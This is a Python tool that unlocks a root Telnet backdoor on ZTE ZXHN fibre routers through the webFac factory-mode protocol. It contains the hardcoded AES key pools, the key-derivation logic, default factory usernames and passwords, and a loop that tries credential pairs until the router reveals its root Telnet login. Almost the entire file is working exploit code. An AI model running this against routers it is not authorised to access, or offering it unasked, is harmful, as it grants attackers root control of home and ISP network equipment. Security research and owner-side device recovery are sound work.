#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZTE FactoryMode Telnet Backdoor Unlocker
Enables Mode 2 (Developer/Root) Telnet on ZTE ZXHN ONTs via the webFac HTTP challenge-response protocol.

License: GNU Affero General Public License v3.0 (AGPL-3.0)
Adapted from protocol research by douniwan5788 (https://github.com/douniwan5788/zte_modem_tools)
See NOTICE and LICENSE for details.
"""

import argparse
import re
import sys
from random import Random
import requests

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None


def pad(data_to_pad: bytes, block_size: int = 16) -> bytes:
    """Zero-pad to a multiple of block_size."""
    padding_len = block_size - (len(data_to_pad) % block_size)
    return data_to_pad + b'\x00' * padding_len


def unpad(padded_data: bytes, block_size: int = 16) -> bytes:
    """Zero-unpad null-terminated string bytes."""
    return padded_data[:-block_size] + padded_data[-block_size:].rstrip(b'\x00')


class WebFac:
    AES_KEY_POOL = [
        0x7B, 0x56, 0xB0, 0xF7, 0xDA, 0x0E, 0x68, 0x52, 0xC8, 0x19,
        0xF3, 0x2B, 0x84, 0x90, 0x79, 0xE5, 0x62, 0xF8, 0xEA, 0xD2,
        0x64, 0x93, 0x87, 0xDF, 0x73, 0xD7, 0xFB, 0xCC, 0xAA, 0xFE,
        0x75, 0x43, 0x1C, 0x29, 0xDF, 0x4C, 0x52, 0x2C, 0x6E, 0x7B,
        0x45, 0x3D, 0x1F, 0xF1, 0xDE, 0xBC, 0x27, 0x85, 0x8A, 0x45,
        0x91, 0xBE, 0x38, 0x13, 0xDE, 0x67, 0x32, 0x08, 0x54, 0x11,
        0x75, 0xF4, 0xD3, 0xB4, 0xA4, 0xB3, 0x12, 0x86, 0x67, 0x23,
        0x99, 0x4C, 0x61, 0x7F, 0xB1, 0xD2, 0x30, 0xDF, 0x47, 0xF1,
        0x76, 0x93, 0xA3, 0x8C, 0x95, 0xD3, 0x59, 0xBF, 0x87, 0x8E,
        0xF3, 0xB3, 0xE4, 0x76, 0x49, 0x88
    ]

    AES_KEY_POOL_NEW = [
        0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
        0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
        0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
        0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
        0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
        0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
        0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
        0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
        0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
        0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99
    ]

    def __init__(self, ip: str, port: int, user: str, pw: str):
        if AES is None:
            raise ImportError("pycryptodome is required. Please install with: pip install pycryptodome")
        self.ip = ip
        self.port = port
        self.user = user
        self.pw = pw
        self.session = requests.Session()
        self.cipher = None

    def reset(self) -> bool:
        try:
            resp = self.session.post(f"http://{self.ip}:{self.port}/webFac", data='SendSq.gch', timeout=5)
            return resp.status_code == 400
        except Exception:
            return False

    def request_factory_mode(self):
        try:
            self.session.post(f"http://{self.ip}:{self.port}/webFac", data='RequestFactoryMode.gch', timeout=5)
        except requests.exceptions.ConnectionError:
            # The router resets HTTP connection here by design
            pass
        except Exception as e:
            print(f"[-] request_factory_mode exception: {e}")

    def send_sq(self):
        try:
            rand = Random().randint(0, 59)
            resp = self.session.post(
                f"http://{self.ip}:{self.port}/webFac",
                data=f'SendSq.gch?rand={rand}\r\n',
                timeout=5
            )
            if resp.status_code != 200:
                return False

            if len(resp.content) == 0:
                index = rand
                key_pool = self.AES_KEY_POOL
                version = 1
            elif "newrand" in resp.text:
                newrand = int(resp.text[len("newrand="):].strip())
                index = ((0x1000193 * rand) & 0x3F ^ newrand) % 60
                key_pool = self.AES_KEY_POOL_NEW
                version = 2
            else:
                return False

            raw_key = bytes([(x ^ 0xA5) & 0xFF for x in key_pool[index:index + 24]])
            self.cipher = AES.new(raw_key, AES.MODE_ECB)
            return version
        except Exception as e:
            print(f"[-] send_sq exception: {e}")
            return False

    def send_info(self) -> bool:
        try:
            payload = self.cipher.encrypt(pad(b'SendInfo.gch?info=6|', 16))
            resp = self.session.post(f"http://{self.ip}:{self.port}/webFacEntry", data=payload, timeout=5)
            return resp.status_code == 200
        except Exception as e:
            print(f"[-] send_info exception: {e}")
            return False

    def check_login_auth(self):
        try:
            payload = self.cipher.encrypt(
                pad(f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode('latin1'), 16)
            )
            resp = self.session.post(f"http://{self.ip}:{self.port}/webFacEntry", data=payload, timeout=5)
            if resp.status_code == 200:
                ciphertext = resp.content
                if len(ciphertext) % 16:
                    ciphertext = pad(ciphertext, 16)
                return unpad(self.cipher.decrypt(ciphertext), 16)
        except Exception as e:
            print(f"[-] check_login_auth exception: {e}")
        return False

    def open_telnet_factory_mode(self):
        try:
            payload = self.cipher.encrypt(pad(b'FactoryMode.gch?mode=2&user=notused', 16))
            resp = self.session.post(f"http://{self.ip}:{self.port}/webFacEntry", data=payload, timeout=5)
            if resp.status_code == 200:
                return unpad(self.cipher.decrypt(resp.content), 16)
        except Exception as e:
            print(f"[-] open_telnet_factory_mode exception: {e}")
        return False


def unlock_factory_telnet(ip: str = "192.168.11.1", port: int = 80,
                          users=None, passwords=None, verbose: bool = False):
    """
    Attempts FactoryMode authentication against ZTE router.
    Returns (username, password) tuple for root Telnet session upon success, or None.
    """
    if users is None:
        users = ['factorymode', 'CMCCAdmin', 'telecomadmin']
    elif isinstance(users, str):
        users = [users]

    if passwords is None:
        passwords = ['nE%jA@5b', 'aDm8H%MdA', '1620@CTCC']
    elif isinstance(passwords, str):
        passwords = [passwords]

    for user in users:
        for pw in passwords:
            if verbose:
                print(f"[*] Trying factory login user='{user}', pass='{pw}' on {ip}:{port}...")

            fac = WebFac(ip, port, user, pw)
            fac.reset()
            fac.request_factory_mode()
            version = fac.send_sq()
            if not version:
                continue

            if version == 1:
                auth_result = fac.check_login_auth()
                if not auth_result:
                    continue
            elif version == 2:
                if not fac.send_info():
                    continue
                auth_result = fac.check_login_auth()
                if not auth_result:
                    continue

            # Request mode 2 (dev/root)
            raw_url = fac.open_telnet_factory_mode()
            if not raw_url:
                continue

            decoded = raw_url.decode('latin1', errors='ignore') if isinstance(raw_url, bytes) else str(raw_url)
            m = re.search(r'user=([^&]+)&pass=([^\x00\r\n&]+)', decoded)
            if m:
                t_user = m.group(1).strip('\x00')
                t_pass = m.group(2).strip('\x00')
                return t_user, t_pass

    return None


def main():
    parser = argparse.ArgumentParser(description="ZTE ZXHN FactoryMode Telnet Backdoor Unlocker")
    parser.add_argument("--ip", default="192.168.11.1", help="Router IP address (default: 192.168.11.1)")
    parser.add_argument("--port", type=int, default=80, help="Router HTTP port (default: 80)")
    parser.add_argument("--user", default="factorymode", help="Factory user (default: factorymode)")
    parser.add_argument("--pass", dest="password", default="nE%jA@5b", help="Factory password (default: nE%%jA@5b)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print(f"[*] Probing ZTE FactoryMode backdoor on {args.ip}:{args.port}...")
    creds = unlock_factory_telnet(args.ip, args.port, [args.user], [args.password], verbose=args.verbose)
    if creds:
        user, pw = creds
        print("=" * 60)
        print("  [+] SUCCESS! Mode 2 Dev/Root Telnet Unlocked on Port 23")
        print(f"      IP Address: {args.ip}")
        print(f"      Username:   {user}")
        print(f"      Password:   {pw}")
        print("=" * 60)
        print(f"\nConnect now via: telnet {args.ip}")
    else:
        print("[-] Failed to unlock Telnet. Check router IP and credentials.")
        sys.exit(1)


if __name__ == "__main__":
    main()
